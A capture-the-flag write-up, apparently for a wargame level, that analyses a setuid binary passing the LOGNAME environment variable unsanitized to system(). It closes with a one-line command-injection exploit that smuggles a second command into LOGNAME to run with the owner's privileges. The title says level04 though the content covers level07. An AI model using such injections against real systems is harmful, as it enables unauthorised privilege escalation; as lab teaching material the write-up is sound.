# level04

## Scanning

**1. Who are we ?**
```sh
$ id
uid=2007(level07) gid=2007(level07) groups=2007(level07),100(users)
```

**2. Where are we ?** 👀
```sh
$ ls -laR
.:
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

## Solution

We found one suspicious file: `/home/user/level07/level07`.
It is a binary file.

### Privileges

We determined `/home/user/level07/level07` is a prime candidate for privilege escalation because:
- It is owned by `flag07` (our target).
- The group owner is `level07` (which matches our user's group).
- It has the `setuid permission bit` (`s`) set, which grants us the owner's privileges during the program's execution.

This means that, during script execution through the user `level07`, the privilege state is as follows:  
- Real UID: `level07`
- Real GUID: `level07`
- Effective UID: `flag07`
- Effective GUID: `level07`

### Script(s) behaviour(s)

We use [Ghidra](https://github.com/nationalsecurityagency/ghidra) to deassemble and analyze it's content to an equivalent of **C** to understand it's behaviour. We added additionnal comments for additional information.
```c
int main(int argc,char **argv,char **envp)
{
  char *param2;
  int iVar1;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
                    /* Unresolved local var: char * buffer@[DW_OP_breg4(ESP): +20]
                       Unresolved local var: gid_t gid@[DW_OP_breg4(ESP): +24]
                       Unresolved local var: uid_t uid@[DW_OP_breg4(ESP): +28] */

  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  // Retrieve the user-controlled environment variable LOGNAME.
  param2 = getenv("LOGNAME");
  // Construct the following command '/bin/echo [PAYLOAD]',
  // where the payload is the value of the unsanitized LOGNAME env var
  asprintf(&local_1c,"/bin/echo %s ",param2);
  // Execute the comamnd in a subshell, passing through current effective permissions.
  iVar1 = system(local_1c);
  return iVar1;
}
```
This binary exhibits a classic **OS command injection vulnerability** with privilege escalation.
We can shortcut the `/bin/echo` call and pass to `system()` any other command we'd wish.

```sh
$ LOGNAME="; getflag;" /home/user/level07/level07
```

And there is the flag !
